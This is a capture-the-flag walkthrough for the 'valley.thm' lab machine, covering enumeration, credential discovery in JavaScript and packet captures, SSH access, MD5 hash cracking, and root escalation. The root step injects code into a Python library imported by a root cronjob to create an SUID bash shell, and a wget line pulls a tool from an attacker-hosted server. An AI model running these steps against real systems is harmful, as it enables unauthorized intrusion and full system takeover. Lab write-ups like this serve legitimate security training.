# Enumeration

## \[+] 10.10.156.15 - valley.thm

Using `echo` and `>>` to append the IP address with the domain name to my `/etc/hosts` file. Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online:

```sh
sudo echo '110.10.156.15 valley.thm' >> /etc/hosts
export RHOSTS=10.10.156.15
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

### \[-] valley.thm

Here we have a website for a photgraphy company:

![b6d0b042c854f9af4160cc2e666a5bf0.png](/resources/0f742bf2fe1e4a3e91e8d473db1ad965.png)

There isn't much here at first so let's try fuzzing for files and directories using [feroxbuster](https://github.com/epi052/feroxbuster) with this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt):

```sh
feroxbuster -u http://valley.thm/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x json,txt,js,xml -s 200,301,302,403 -o p-80-www-ferox.txt
```

![639e75b02ab25a452ba6aeba2cc9d053.png](/resources/94134c2f9cc74599b5c4dfe7f898207e.png)

From `valley.thm/pricing/note.txt` we get a clue that there may be more notes laying around on the web server:

```plaintext
J,
Please stop leaving notes randomly on the website
-RP
```

### \[-] valley.thm/gallery/gallery.html

Here we have a basic image gallery:

![c432cd3254d50c8801f2d3e4401b2d52.png](/resources/575bcc25cd3440f789f334b40b4dff0c.png)

There aren't many features to test, but if we click on the image, we are sent to the URL `http://valley.thm/static/1`. There are two things we can do here.

First we will save the image and check the metadata by running the command:

```sh
exiftool 1.jpeg
```

We will find the Content Management System (CMS) used to run this website:

![1eeef9d82e0c5a991b79eea1066c8b15.png](/resources/ddccb3669df94c339ec89b70d76d3be4.png)

Next, if we change the number `1` in the URL to other numbers not listed on the gallery, like `00` we might find something interesting.

From `http://valley.thm/static/00`:

```plaintext
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

### \[-] valley.thm/dev1243224123123/

Now we have something a little more interesting, a login portal:

![f7d8c2c6d0f474a2c77f03f1cd1dece7.png](/resources/9782762bdbe249a5891012302196a4ae.png)

Before trying anything here, let's fuzz for files and directories again by appending `dev1243224123123/` to the URL in our `feroxbuster` command and change the file name of the `-o` flag so we don't overwrite our last scan:

```sh
feroxbuster -u http://valley.thm/dev1243224123123/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x json,txt,js,xml -s 200,301,302,403 -o p-80-dev-ferox.txt
```

![c361ce651322423d5b58e37c46773056.png](/resources/1a0070de09cd45c58e7db7b9d1d1d8e4.png)

From `/dev1243224123123/dev.js` we will find the source code for the login portal and the username/password requirements which we can use to create a wordlist for brute forcing:

![f8323a6c35b357881d9ad6beb89f4949.png](/resources/c1d3e1a1857b4723b5fcb014bdd23556.png)

Even better, further down there are some hardcoded credentials and another note:

![e5cd68d09d7cacd3ec586271b92756f3.png](/resources/de1b7e80ceb243f289b493d55d704359.png)

From `/dev1243224123123/devNotes37370.txt`:

```plaintext
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

## Port 37370 - FTP

We can now log in with the credentials found from `dev.js` using the [ftp](https://linux.die.net/man/1/ftp) command and input the password when prompted:

```sh
ftp <USERNAME>@$RHOSTS 37370
```

After connecting to the FTP we can list the files using `ls -lah`:

```sh
ls -lah
```

![35a52b1ce45afd1c542f1a8af7af7d83.png](/resources/b3634408fbdc475399e2fe6c4da1de71.png)

Then use the `mget` command with the asterisk (`*`) and enter `a` when prompted to download all files:

```sh
mget *
a
```

![916e9a2cede5b563786432a42e702021.png](/resources/8253629be73642c6893daa73cb66edbe.png)

#### \[-] siemFTP.pcapng

First we will use Wireshark to anaylyze the network traffic captured in this PCAPNG file.

After opening the file in Wireshakre, press the keys `CTRL + ALT + SHIFT + T` simultaneously to open the "Follow TCP Stream" window:

![bbefed62fac14eaf6531995b1e84656c.png](/resources/90a8233aa858412f8294c007cb641844.png)

Since the traffic is not encrypted we are able to see the entire conversation in plaintext. There is nothing interesting here, so we will move on.

#### \[-] siemHTTP1.pcapng

We can do the same thing for this PCAPNG file and find some regular web browsing traffic:

![b87014edcdbfe1d070cfa3378a57a43b.png](/resources/d9b410163efc441ab96d539188e1a255.png)

# Initial Access

### \[-] valleyDev\@valley

#### \[-] siemHTTP2.pcapng

This time, we are not able to view the traffic since it's encrypted. Wireshark can still try to export the unencrypted elements in the data.

Navigate to `File → Export Objects → HTTP` to open the "Export HTTP objects list" window:

![d75ca1c0036ae994d06fa8255637a7ce.png](/resources/1fc7154c04334a45afd6cbde4f0a155c.png)

We can choose to either save all the objects, or save them individually. The two objects that stand out are the intereactions with `index.html`. Packet 2335 has a Size of 42 bytes has a Content Type of `applicatiom/x-www-form-urlencoded` which is usually data for a form like a login portal. Packet 2337 has a Size of 764 bytes which could be the login portal page itself.

#### \[-] Packet 2337 - index.html:

Since we only downloaded the HTML page, there are no images that could be loaded so we get the bare login portal:

![6636c6376c4bb068f45ae84bc2eb2d8f.png](/resources/20bfbc02059544cda583a44140474d7a.png)

#### \[-] Packet 2335 - index.html

Here we find the plaintext credentials that was sent when the user filled in the login form and clicked the "Login" button:

![cef1033b5dd7324991f0b78270b4c4a6.png](/resources/52cb61f8aa8243f6a0ac1bcb5bc87b9a.png)

## Port 22 - SSH

Now that we have the credentials for SSH, we can login using the [ssh](https://linux.die.net/man/1/ftp) command and enter the password when prompted:

```sh
ssh <USERNAME>@$RHOSTS
```

Then get the user flag in `/home/valleyDev/user.txt`:

```sh
cat /home/valleyDev/user.txt
```

![86b43da3b4b3ad241293b4612d1fe1ea.png](/resources/b788b1fb08bb49c5802509ef929b95f6.png)

# Privilege Escalation

### \[-] valley\@valley

If we go up a directory to `/home` we'll find the usernames of the other users on this machine and a binary named "`valleyAuthenticator`":

```sh
cd ..
ls -lah
```

![dad44a658e238ff008d6cd3c0a5816c0.png](/resources/0032561a5ffa410c81c5a8799277fac0.png)

We can transfer the file to our machine for further analysis using the scp command and enter the password when prompted will save the `valleyAuthenticator` binary to our `/tmp` directory:

```sh
scp <VICTIM_USER>@<VICTIM_IP>:/home/valleyAuthenticator /tmp
```

After the file has been transferred to our attacking machine, we can use the strings tool along with grep to search for any hardcoded credentials by running the command:

```sh
strings valleyAuthenticator | grep -C 20 user
```

The `-C 20` flag in `grep` will give us the surrounding 20 lines around our search term, `user`. We will find some plaintext which asks for a username and password, but above that is a string that looks like it has been hashed using the insecure [MD5](https://en.wikipedia.org/wiki/MD5) algorithm:

![483ab845e56d4bc6bbcfd37c31f28bca.png](/resources/33411c97f3fe4b588393c18b0efdeb37.png)

If we use a website like [Crackstation](https://crackstation.net/), we will be able to reverse the hash using their rainbow table:

![54faa1689a59e55e4cdc704cc422d5a4.png](/resources/1ebcca83b4be4b0bbcae131520531648.png)

Now we can SSH into the user `valley` then run the `id` command after connecting:

```sh
ssh valley@$RHOSTS
id
```

![61cb7af94cf5736a59b632ff9c33aa57.png](/resources/884571a581144c87acdc9faa9356ba70.png)

Note that we are also apart of the `valleyAdmin` group and we can search for accessible files using:

```sh
find / -type f -group 1003 2>/dev/null
```

![cef8d30db9def8499decf493eb8b9c4b.png](/resources/82f3e9cb4b8d4f52b0495a520e9156fd.png)

If we check the file permission we will find that we have full permissions because we are in the `valleyAdmin` group:

![94d2856238d0ab48150884b7cb25f1bc.png](/resources/dc36af7332ac44aeb968d4d4de6de7f5.png)

Now, let's use [pspy](https://github.com/DominicBreuker/pspy) to monitor the processes that are running on the machine. On the attacking machine, after downloading the 32 or 64 bit version, we can host it using Python:

```sh
python3 -m http.server 8888
```

Then on the victim machine, we first move to a directory like `/tmp` then run the [wget](https://linux.die.net/man/1/wget) command to download the file:

```sh
cd /tmp
wget <ATTACKER_IP>:8888/pspy32
```

![9715b0c35278627c31e664f1750187f1.png](/resources/8761c0a93eea48dbb2fe3da488fbcc2c.png)

After the download is completed, we need to give `pspy32` executable permissions using the [chmod](https://linux.die.net/man/1/chmod) command with `+x` flag to enable executable permissions and run the binary using `./pspy32`:

```sh
chmod +x pspy32
./pspy32
```

![1487cb9957649efa58929f64c71f12dc.png](/resources/5f1a49941e57443a83096b37b107d57a.png)

Let pspy run for a few minutes and we should find a scheduled task (or [cronjob](https://en.wikipedia.org/wiki/Cron)) being ran every minute:

![8aa963152dab13016b875dd78258cd26.png](/resources/a0a1798250c741318b7b8a105378bb41.png)

Press `CTRL + C` to stop pspy and close it.

Checking the file permissions for `photosEncrypt.py` shows that it is owned by the user `root`:

```sh
ls -lah /photos/script/photosEncrypt.py
```

![3e76647abc50d933355d3412e9ece95a.png](/resources/68cf934860eb41a1846e55c13fbfa671.png)

We can review the source code by using `cat` and find that this script is importing from `base64.py` which we have write access to:

```sh
cat /photos/script/photosEncrypt.py
```

![6232b6094c465c5e3db9a37b116f558c.png](/resources/2a6795cd0b2e4c55b1afaee69dbd1bf9.png)

### \[-] root\@valley

All we need to do is edit the `/usr/lib/python3.8/base64.py` file with our code which will be ran by the cronjob under the context of the `root` user. If we ran a system command to create a shell with full permissions we will effectively become root.

First, let's open the file in [vi](https://linux.die.net/man/1/vi):

```sh
vi /usr/lib/python3.8/base64.py
```

Next, we want to import the OS library by adding it after `import binascii`. Then after a new line, we use the `os.system()` function to run any Linux command of our choosing, here we'll make a copy of `/bin/bash` to the `/tmp` directory then use `chmod` to give it the [SUID bit](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit).

To do this in VI/VIM, we move the text cursor to the position we want to start typing, press the `i` key to enable input mode, paste our code in, press the `ESC` key, then type `:wq` to write to the file and quit the application:

```py
import os

os.system("cp /bin/bash /tmp && chmod u+s /tmp/bash")
```

After a minute, we can check the `/tmp` directory again to find a copy of the bash shell with the SUID bit set:

```sh
ls -lah /tmp
```

![4e668791d5bfaecb944e7a948d986d53.png](/resources/9de7e48d33cf401baa6a817d1d4d5825.png)

Now we can run the shell using the `-p` flag which will maintain permissions of the `root` user:

```sh
./bash -p
```

![4adaffd689a632cd8a9f42e0d3478028.png](/resources/8810e570a7ba410daf6cf402597e1f9d.png)

We can get the root flag in `/root/root.txt`:

```sh
cat /root/root.txt
```

![e9c1610cd39f1c76c3c7dc68b22a7d8e.png](/resources/9db304dde2ee43708243be702e0ec3e7.png)
